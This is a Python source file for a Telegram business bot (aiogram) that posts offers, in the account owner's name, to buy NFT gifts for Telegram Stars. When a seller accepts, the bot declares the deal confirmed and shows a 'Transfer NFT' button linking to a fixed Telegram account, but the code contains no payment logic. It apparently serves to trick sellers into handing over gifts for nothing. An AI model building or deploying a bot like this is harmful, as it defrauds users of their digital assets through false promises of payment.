import asyncio
import logging
import re
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# Берем токен из настроек хостинга
TOKEN = os.getenv("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# Обработка команды .buy в бизнес-чатах
@dp.business_message(F.text.startswith("!buy") | F.text.startswith(".buy"))
async def create_offer(message: types.Message):
    # Ищем ссылку и цену в тексте
    pattern = r'(?:!buy|\.buy)\s+(https?://\S+)\s+(\d+)\s+(Stars|TON)\s+(\w+)'
    match = re.search(pattern, message.text)
    
    if not match:
        await message.reply("❌ Ошибка! Формат: `!buy ссылка 650 Stars ru`", parse_mode="Markdown")
        return

    nft_link, price, currency, lang = match.groups()
    
    # Кнопки для оффера
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data="accept_offer"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data="decline_offer")
        ]
    ])

    text = (
        f"Готов(а) дать **{price}** ⭐ за этот подарок.\n\n"
        f"Действует еще 24 часа.\n"
        f"Ссылка: {nft_link}"
    )
    
    # Отправляем от вашего имени
    await bot.send_message(
        chat_id=message.chat.id,
        text=text,
        reply_markup=keyboard,
        parse_mode="Markdown",
        business_connection_id=message.business_connection_id
    )

# Обработка кнопки "Принять"
@dp.callback_query(F.data == "accept_offer")
async def process_accept(callback: CallbackQuery):
    transfer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать NFT", url="https://t.me/tamerlan111")]
    ])

    await callback.answer("Оффер принят!")
    
    text = "Сделка подтверждена. Передайте подарок покупателю."
    
    try:
        await bot.send_message(
            chat_id=callback.message.chat.id,
            text=text,
            reply_markup=transfer_keyboard,
            business_connection_id=callback.message.business_connection_id
        )
    except Exception:
        await callback.message.answer(text, reply_markup=transfer_keyboard)

# Обработка кнопки "Отклонить"
@dp.callback_query(F.data == "decline_offer")
async def process_decline(callback: CallbackQuery):
    await callback.answer("Оффер отклонен.")
    try:
        await callback.message.edit_text("❌ Оффер был отклонен.")
    except Exception:
        pass

async def main():
    print("Бизнес-бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
